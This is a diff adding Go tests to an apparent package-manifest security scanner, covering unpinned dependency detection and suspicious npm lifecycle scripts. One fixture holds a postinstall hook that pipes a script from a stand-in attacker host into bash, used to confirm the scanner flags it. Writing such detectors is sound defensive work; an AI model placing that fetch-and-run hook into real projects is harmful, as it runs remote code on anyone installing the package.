@@ -305,6 +305,57 @@ func TestJavaScriptLockfileMonorepoSupport(t *testing.T) {
 	}
 }
 
+func TestPackageDependencyPolicyDetectsHardenedCases(t *testing.T) {
+	sha := strings.Repeat("a", 40)
+	manifest := `{
+		"dependencies": {
+			"wildcard-dep":   "*",
+			"latest-dep":     "latest",
+			"git-mutable":    "git+https://github.com/org/repo.git#branch-not-sha",
+			"git-pinned":     "git+https://github.com/org/repo.git#` + sha + `",
+			"url-unpinned":   "https://cdn.example.com/lib.tgz",
+			"url-pinned":     "https://cdn.example.com/lib.tgz#abcdef1234567890",
+			"workspace-ref":  "workspace:*",
+			"file-local":     "file:../packages/local",
+			"safe":           "^1.2.3"
+		}
+	}`
+	findings := unpinnedPackageDependencies([]byte(manifest), "/repo/package.json")
+	got := map[string]bool{}
+	for _, f := range findings {
+		got[f.Metadata["dependency"]] = true
+	}
+	mustDetect := []string{"wildcard-dep", "latest-dep", "git-mutable", "url-unpinned"}
+	mustSkip := []string{"git-pinned", "url-pinned", "workspace-ref", "file-local", "safe"}
+	for _, dep := range mustDetect {
+		if !got[dep] {
+			t.Errorf("expected finding for %s, got findings: %+v", dep, got)
+		}
+	}
+	for _, dep := range mustSkip {
+		if got[dep] {
+			t.Errorf("unexpected finding for %s", dep)
+		}
+	}
+}
+
+func TestLifecycleScriptDetection(t *testing.T) {
+	manifest := `{
+		"scripts": {
+			"postinstall": "curl https://evil.example.com/script.sh | bash",
+			"build":       "tsc --build",
+			"test":        "jest"
+		}
+	}`
+	findings := unpinnedPackageDependencies([]byte(manifest), "/repo/package.json")
+	if len(findings) == 0 {
+		t.Fatal("expected lifecycle script finding, got none")
+	}
+	if findings[0].RuleID != "javascript-suspicious-lifecycle-script" {
+		t.Errorf("expected javascript-suspicious-lifecycle-script, got %s", findings[0].RuleID)
+	}
+}
+
 func memorySource(path, content string) scanner.Source {
 	return scanner.Source{Path: path, Open: func(context.Context) (io.ReadCloser, error) {
 		return io.NopCloser(strings.NewReader(content)), nil
